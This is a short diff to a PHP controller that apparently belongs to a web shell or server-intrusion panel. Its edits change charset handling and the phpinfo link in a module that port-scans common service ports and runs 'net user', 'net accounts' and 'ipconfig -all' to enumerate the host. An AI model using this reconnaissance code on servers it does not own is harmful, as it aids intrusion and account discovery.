@@ -33,7 +33,6 @@ class ToolController extends CommonController{
                 $_POST['ip'] = '127.0.0.1';
                 $_POST['port'] = '21,25,80,110,135,139,445,1433,3306,3389,5631,43958';
            }
-           
            $this->display('Tool/portscan');
            abortConnect();
      }
@@ -129,12 +128,13 @@ class ToolController extends CommonController{
         		}
         		
            }else{
-                $list[] = array('OS Version', iconv('gb2312', 'utf-8', execute('ver')));
+                $list[] = array('OS Version', execute('ver'));
                 $list[] = array('Account Settings', nl2br(execute('net accounts')));
                 $list[] = array('User Accounts', nl2br(execute('net user')));
                 $list[] = array('IP Configurate', nl2br(execute('ipconfig -all')));
            }
-   
+           
+           $list = auto_charset($list);
            $this->assign('list', $list);
            $this->display();
            abortConnect();
@@ -176,7 +176,7 @@ class ToolController extends CommonController{
 			array('The file path',__FILE__),
 	
 			array('PHP Version',PHP_VERSION),
-			array('PHPINFO',(IS_PHPINFO ? '<a href="'.__ROOT__.'index/phpInfo" target="_blank" style="text-decoration:underline;color:blue" >Yes</a>' : 'No')),
+			array('PHPINFO','<a href="'.__ROOT__.'index/phpInfo" target="_blank" style="text-decoration:underline;color:blue" >Yes</a>'),
 			array('Safe Mode',$this->getCfg('safe_mode')),
 			array('Administrator',$adminmail),
 			array('allow_url_fopen',$this->getCfg('allow_url_fopen')),
